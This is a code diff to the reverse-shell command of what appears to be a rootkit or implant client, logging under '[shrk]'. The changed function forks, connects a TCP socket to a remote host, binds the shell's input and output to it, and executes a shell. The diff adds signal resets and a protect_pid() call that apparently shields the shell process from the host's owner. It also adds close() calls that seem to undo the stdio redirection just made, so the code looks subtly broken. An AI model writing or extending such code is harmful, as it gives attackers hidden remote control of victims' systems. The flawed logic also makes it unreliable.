@@ -3,6 +3,8 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#include <signal.h>
+#include <unistd.h>
 
 #include <errno.h>
 #include <stdio.h>
@@ -43,6 +45,15 @@ char *cmd_shell(job_t *job) {
   if ((cpid = fork()) == 0) {
     int s = 0;
 
+    // remove signal handlers
+    signal(SIGINT, SIG_DFL);
+    signal(SIGILL, SIG_DFL);
+    signal(SIGSEGV, SIG_DFL);
+
+    // chdir to rootdir
+    if(chdir("/") < 0)
+      exit(1);
+
     // create a TCP socket for the reverse shell connection
     if ((s = socket(saddr.sa_family, SOCK_STREAM, 0)) < 0)
       exit(1);
@@ -52,9 +63,13 @@ char *cmd_shell(job_t *job) {
       exit(1);
 
     // duplicate std{out,in,err}
-    dup2(s, 0);
-    dup2(s, 1);
-    dup2(s, 2);
+    dup2(s, fileno(stdout));
+    dup2(s, fileno(stderr));
+    dup2(s, fileno(stdin));
+
+    close(fileno(stdout));
+    close(fileno(stderr));
+    close(fileno(stdin));
 
     // execute da shell we found
     printf("[shrk] connection was successful, executing %s\n", shell);
@@ -68,10 +83,16 @@ char *cmd_shell(job_t *job) {
   }
 
   if (cpid < 0) {
-    job_debug("failed to create fork for the reverse shell: %s", strerror(errno));
+    job_debug_err("failed to create fork for the reverse shell");
     return "fork failed";
   }
 
-  job_debug("launched a child process (%d) for a %s reverse shell", cpid, *shell);
+  // protect the PID
+  if(!protect_pid(cpid)){
+    job_debug("failed to protect the reverse shell process");
+    return "failed to protect the reverse shell process";
+  }
+
+  job_debug("launched a child process (%d) for a %s reverse shell", cpid, shell);
   return "success";
 }
